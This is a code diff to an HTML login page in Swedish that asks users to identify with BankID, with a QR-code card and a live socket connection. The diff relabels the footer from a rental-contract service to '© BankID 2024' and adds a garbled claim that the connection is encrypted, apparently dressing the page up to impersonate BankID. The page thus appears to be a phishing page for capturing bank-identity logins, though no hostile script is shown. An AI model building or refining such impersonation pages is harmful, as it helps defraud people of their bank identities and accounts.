@@ -10,6 +10,13 @@
     <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="../static/css/style_extra.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+
+    <!-- <script>
+        setInterval(function() {
+            location.reload();
+        }, 1000);
+    </script> -->
+
 </head>
 <body>
     <div class="logo">
@@ -19,7 +26,9 @@
     <div class="content-container">
         <div id="mainTextContainer">Legitimering med BankID</div>
         <div id="agreeSignText">
-            För att säkerställa din identitet använder vi BankID. Genom att logga in bekräftar du att det är du som utför åtgärden. Följ instruktionerna för en enkel och säker inloggning. Din säkerhet är vår prioritet.
+            För att säkerställa din identitet använder vi BankID. Genom att logga in bekräftar du att det är du som utför åtgärden. <br>
+            Följ instruktionerna för en enkel och säker inloggning. <br>
+            Din säkerhet är vår prioritet.
         </div>
 
         <div class="card" id="qrCard" style="display: none;">
@@ -39,7 +48,8 @@
     </div>
 
     <div class="footer">
-            <p>© 2024 Digitala Hyreskontrakt</p>
+            <p>© BankID 2024<br>
+                Denna anslut är krypterad</p>
     </div>
 
     <script src="../static/js/script_extra.js"></script>
